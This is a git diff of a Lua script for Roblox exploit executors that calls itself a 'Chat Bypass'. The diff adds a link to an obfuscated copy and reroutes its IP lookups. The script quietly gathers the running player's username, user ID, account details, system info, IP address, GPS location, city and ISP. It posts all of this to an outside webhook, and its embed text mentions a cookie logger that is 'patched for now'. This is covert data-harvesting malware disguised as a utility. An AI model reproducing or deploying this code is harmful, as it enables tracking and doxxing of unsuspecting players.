@@ -1,6 +1,9 @@
+--OBFUSCATED VERSION https://customwebhook.vercel.app/obfuscatedshit.lua--
+
 getgenv().whscript = "Chat Bypass"
 getgenv().webhookexecUrl = "https://customwebhook.vercel.app/api/webhook"
 getgenv().ExecLogSecret = true
+getgenv().idsss = "fdd3bbdc9554f43c65140baa02e1baf562b00686d09c91f40dd7101c0126cacc"
 
 local ui = gethui()
 local folderName = "screen"
@@ -30,38 +33,40 @@ local gameVersion = game.PlaceVersion
 local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
 
 local function checkPremium()
-    local success, response = pcall(function() return player.MembershipType end)
-    return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
+	local success, response = pcall(function() return player.MembershipType end)
+	return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
 end
 
 local url = getgenv().webhookexecUrl
+local webhookids = getgenv().idsss
 local data = {
-    ["content"] = "@everyone",
-    ["content_2"] = "@everyone",
-    ['webhookid'] = 'fdd3bbdc9554f43c65140baa02e1baf562b00686d09c91f40dd7101c0126cacc', --ask playvora_1 to generate it
-    ["embeds"] = {{
-        ["title"] = "MADE BY DXFC EDITED BY PLAYVORA | 🚀 **Script Execution Detected | Exec Log**",
-        ["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
-        ["type"] = "rich",
-        ["color"] = tonumber(0xe67e22),
-        ["fields"] = {
-            {["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
-            {["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
-            {["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. checkPremium() .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
-            {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```", ["inline"] = false},
-            {["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
-            {["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
-            {["name"] = "🖥️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
-            {["name"] = "📍 **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
-            {["name"] = "🪧 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
-        },
-        ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278795377176346684/IMG_5005.gif?ex=66d21a80&is=66d0c900&hm=8eb3f7689d767e13d36c7eb8ed4bead77728f874fee7f059d5edabf5fccd79aa&"},
-        ["footer"] = {["text"] = "Made by dxfc with ❤️ | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278792866495463454/IMG_5003.gif?ex=66d2182a&is=66d0c6aa&hm=3b55a9e00514d207da9067e03e8a84dff72ec35dd06b7be9e5e9974a5be8e980&"}
-    }}
+	["content"] = "@everyone",
+	["content_2"] = "@everyone",
+	['webhookid'] = webhookids, --ask playvora_1 to generate it
+	["embeds"] = {{
+		["title"] = "MADE BY DXFC EDITED BY PLAYVORA | 🚀 **Script Execution Detected | Exec Log**",
+		["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
+		["type"] = "rich",
+		["color"] = tonumber(0xe67e22),
+		["fields"] = {
+			{["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
+			{["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
+			{["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. checkPremium() .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
+			{["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```", ["inline"] = false},
+			{["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
+			{["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
+			{["name"] = "🖥️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
+			{["name"] = "📍 **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
+			{["name"] = "🪧 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
+		},
+		["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278795377176346684/IMG_5005.gif?ex=66d21a80&is=66d0c900&hm=8eb3f7689d767e13d36c7eb8ed4bead77728f874fee7f059d5edabf5fccd79aa&"},
+		["footer"] = {["text"] = "Made by dxfc with ❤️ | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278792866495463454/IMG_5003.gif?ex=66d2182a&is=66d0c6aa&hm=3b55a9e00514d207da9067e03e8a84dff72ec35dd06b7be9e5e9974a5be8e980&"}
+	}}
 }
 
 if getgenv().ExecLogSecret then
-    local ipinfo_table = game.HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/" .. game:HttpGet("https://api.ipify.org") .. "/json"))
+    local ip = game:HttpGet("https://ipsaddress.vercel.app/api/ip")
+    local ipinfo_table = game.HttpService:JSONDecode(game:HttpGet("https://ipsaddress.vercel.app/api/whatismyinfo/" .. ip))
     table.insert(data.embeds[1].fields, {["name"] = "**`(🤫) Secret`**", ["value"] = "||(👣) IP Address: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) GPS Location: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"})
 end
 
